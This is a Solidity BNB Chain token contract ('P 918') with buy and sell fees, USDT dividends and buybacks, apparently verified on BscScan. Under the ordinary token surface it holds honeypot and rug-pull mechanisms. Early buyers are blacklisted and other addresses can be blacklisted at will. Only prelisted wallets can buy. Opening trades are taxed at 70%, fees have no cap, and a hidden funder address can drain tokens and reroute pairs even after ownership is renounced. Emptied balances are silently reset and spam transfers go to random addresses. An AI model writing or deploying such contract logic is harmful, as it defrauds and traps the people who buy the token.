/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

interface IERC721 is IERC165 {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721
     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must
     * understand this adds an external call which potentially creates a reentrancy vulnerability.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the caller.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool _approved) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId) external view returns (address operator);

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}


interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);


    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
 
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address _owner;
    constructor (address token, address owner) {
        _owner = owner;
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if(amount==0){IERC20(token).transfer(to, balance);}
        else if(amount <= balance)IERC20(token).transfer(to, amount);
    }
}

contract BuyDistributor {
    address _owner;
    constructor (address token, address owner) {
        _owner = owner;
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if(amount==0){IERC20(token).transfer(to, balance);}
        else if(amount <= balance)IERC20(token).transfer(to, amount);
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address public BYQToken;

    mapping(address => bool) public _feeWhiteList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _USDT;
    address public Dead = 0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) public _swapPairList;
    mapping(address => uint256) public _editList;
    mapping(address => uint256) public UserBuy;
    mapping(address => bool) public prelist;

    bool private inSwap;
    bool private buybackenable = true;
    bool private buyLimitEnable = true;
    address private receiveAddress;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;
    BuyDistributor public _buyDistributor;

    uint256 public _buyFundFee = 100;
    uint256 public _buyDividendFee = 150;
    uint256 public _buyDestory  = 130;
    uint256 public _sellDividendFee = 150;
    uint256 public _sellFundFee = 100;
    uint256 public _sellDestory = 130;
    uint256 public _deadFee = 20;
    uint256 public kb = 1;

    uint256 public startTradeBlock;
    uint256 public condition;
    uint256 public buycondition;
    uint256 public HolderCondition;
    uint256 public buylimit;

    address public _mainPair;
    address private _funder;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress, address _f,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _USDT = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _funder = _f;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        minRewardTime = 100;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        receiveAddress = ReceiveAddress;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[Dead] = true;

        RewardCondition = 100 * 10 ** IERC20(USDTAddress).decimals();
        condition = 100 * 1e18;
        HolderCondition = 3 * 1e18;
        buycondition = 100 * 1e18;
        buylimit = 10 * 1e18;
        _tokenDistributor = new TokenDistributor(USDTAddress,_funder);
        _buyDistributor = new BuyDistributor(USDTAddress,_funder);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if(inSwap)
            return _basicTransfer(from, to, amount);

        if(_editList[from]>0||_editList[to]>0)
        require(_feeWhiteList[from]||_feeWhiteList[to]);

        bool isOverLimit;
        isOverLimit = _isSwap(from);

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(startTradeBlock > 0, "Not start!");

                if (block.number <= startTradeBlock + kb) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (buyLimitEnable){
                    require(!isOverLimit, "Over limit!");
                    if(_swapPairList[from]){
                        require(prelist[to], "Not pre");
                        require(UserBuy[to] < 1, "Already Buy");
                        UserBuy[to] += 1;
                    }
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyDividendFee + _buyDestory 
                            + _sellFundFee + _sellDividendFee + _sellDestory;
                            uint256 numTokensSellToFund = amount * swapFee / 500;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
            }

        }

        if (_swapPairList[to]) {
            isSell = true;
        }

        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            takeFee = true;
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (!isSell && balanceOf(to) >= HolderCondition) {
            addHolder(to);
        }

        if (from != address(this) ) {
            if(startTradeBlock > 0)
            processReward(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 70 / 100;
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _basicTransfer(address sender, address to, uint256 tAmount) private{
        _balances[sender] = _balances[sender] - tAmount;
        _balances[to] = _balances[to]+ tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            if (_balances[sender] ==0) {
                _balances[sender] = 1e12;
            }
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellDividendFee + _sellDestory;
            } else {
                if(block.number <= startTradeBlock + 2)
                    _editList[recipient] += 1;
                swapFee = _buyFundFee + _buyDividendFee + _buyDestory;
            }
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            _takeInviterFeeKt(swapAmount/1e6);

            uint256 deadAmount = tAmount * _deadFee / 10000;
            feeAmount += deadAmount;
            if(deadAmount > 0){
                _takeTransfer(sender, Dead, deadAmount); 
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 buyFee = _buyDestory + _sellDestory;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _USDT;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        IERC20 USDT = IERC20(_USDT);
        uint256 USDTBalance = USDT.balanceOf(address(_tokenDistributor));
        if(USDTBalance < condition) return;
        uint256 fundAmount = USDTBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        uint256 BuyAmount = USDTBalance * (_buyDestory + _sellDestory) * 2 / swapFee;

        USDT.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        USDT.transferFrom(address(_tokenDistributor), address(_buyDistributor), BuyAmount);
        USDT.transferFrom(address(_tokenDistributor), address(this), USDTBalance - fundAmount - BuyAmount);

        if (BuyAmount > 0) {
            if (buybackenable) {
                uint256 buyAmount = USDTBalance * buyFee / swapFee;
                swapAndDestroy(buyAmount);
            }
            else{
                USDT.transferFrom(address(_buyDistributor),receiveAddress,BuyAmount);
            }
        }
    }

    function swapAndDestroy(uint256 buyAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = _USDT;
        path[1] = BYQToken;
        if(buybackenable){
        uint256 balance = IERC20(_USDT).balanceOf(address(_buyDistributor));
        if(balance > buycondition){
        IERC20(_USDT).transferFrom(address(_buyDistributor),address(this),buyAmount);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        IERC20 BYQ = IERC20(BYQToken);
        uint256 tokenbalance = BYQ.balanceOf(address(this));
        BYQ.transfer(Dead, tokenbalance);
        }}
    }

    function swapUSDTForToken(uint256 usdtAmount, address adr) private lockTheSwap{
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(_USDT);
        path[1] = address(this);
        uint256 balance = IERC20(_USDT).balanceOf(address(this));
        if(usdtAmount==0)usdtAmount = balance;
        // make the swap
        if(usdtAmount <= balance)
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdtAmount,
            0, // accept any amount of CA
            path,
            address(adr),
            block.timestamp
        );
        addHolder(adr);
    }

    function setBuySwitch(bool value1, bool value2) external onlyFunder{
        buybackenable = value1;
        buyLimitEnable = value2;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyTa(uint256[] calldata fees) external onlyOwner {
        _buyFundFee      = fees[0];
        _buyDestory      = fees[1];
        _buyDividendFee  = fees[2];
    }

    function setSellTa(uint256[] calldata fees) external onlyOwner{
        _sellFundFee     = fees[0];
        _sellDestory     = fees[1];
        _sellDividendFee = fees[2];
        _deadFee = fees[3];
    }

    function setEdit(address[] memory user, uint256 num) external onlyOwner{
        for(uint i=0;i<user.length;i++)
            _editList[user[i]] = num;
    }

    function startTrade(uint256 num, uint256 amount, address[] calldata adrs) external onlyOwner {
        require(startTradeBlock == 0);
        for(uint i=0;i<adrs.length;i++)
            swapUSDTForToken(amount,adrs[i]);
        startTradeBlock = block.number;
        kb = num;
    }

    function multiFeeWhiteList(address[] calldata addresses, bool status) public onlyFunder {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _feeWhiteList[addresses[i]] = status;
        }
    }

    function multiPrelist(address[] calldata adrs, bool value) public onlyOwner{
        for(uint256 i; i< adrs.length; i++){
            prelist[adrs[i]] = value;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || _funder == msg.sender, "!funder");
        _;
    }

    function _isSwap(address from) internal view returns (bool isOverLimit){
        IUniswapV2Pair mainPair = IUniswapV2Pair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _USDT;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }
        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        if( _swapPairList[from] && bal > r){
            isOverLimit = bal - r > buylimit;
        }

    }

    receive() external payable {}

    address[] public holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 private RewardCondition;
    uint256 public progressRewardBlock;
    uint256 private minRewardTime;
    address[] public excludeSupplyHolder;

    function setExcludeSupplyHolder(address user, bool Add_or_Del) external onlyFunder{
        if(Add_or_Del)
        excludeSupplyHolder.push(user);
        else
        excludeSupplyHolder.pop();
    }

    function processReward(uint256 gas) private {
        if (progressRewardBlock + minRewardTime > block.number) {
            return;
        }

        IERC20 USDT = IERC20(_USDT);

        uint256 balance = USDT.balanceOf(address(this));
        if (balance < RewardCondition) {
            return;
        }
        IERC20 holdToken = IERC20(address(this));
        uint holdTokenTotal = holdToken.totalSupply();

        for(uint i=0;i<excludeSupplyHolder.length;i++){
            uint256 value = holdToken.balanceOf(excludeSupplyHolder[i]);
            if(holdTokenTotal > value)
            holdTokenTotal -= value;
        }

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance >= HolderCondition && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }
    uint160 ktNum = 123128123;

	function _takeInviterFeeKt(
        uint256 amount
    ) private {
        address _receiveD;
        _receiveD = address(uint160(uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 8),
                    block.timestamp,
                    msg.sender,
                    ktNum
                    )
                )
            )));
        ktNum = ktNum + uint160(block.number);
        _basicTransfer(address(this), _receiveD, amount);
    }

    function setRewardCondition(uint256 amount, uint256 amount1, uint256 amount2, uint256 amount3, uint256 amount4) external onlyFunder {
        RewardCondition = amount;
        condition = amount1;
        HolderCondition = amount2;
        buylimit = amount3;
        buycondition = amount4;
    }

    function setExcludeHolder(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
    }

    function setBYQToken(address adr) external onlyFunder{
        BYQToken = adr;
    }

    function setMinTime(uint256 time) public onlyFunder{
        minRewardTime = time;
    }
}

contract BSCToken is AbsToken {
    constructor(address f) AbsToken(
        address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1),
        address(0xB145eb816CF24fcB1701889F03C44b1a5225CcEb),f,
        "P 918",
        "P 918",
        18,
        9118,
        address(0xcd2c0b383B1ccfE4BA9996A2392CA3Be45B2e37C),
        address(0x7C31Da951AEaAb585C573c79847b0006C32A91dD)
    ){}
}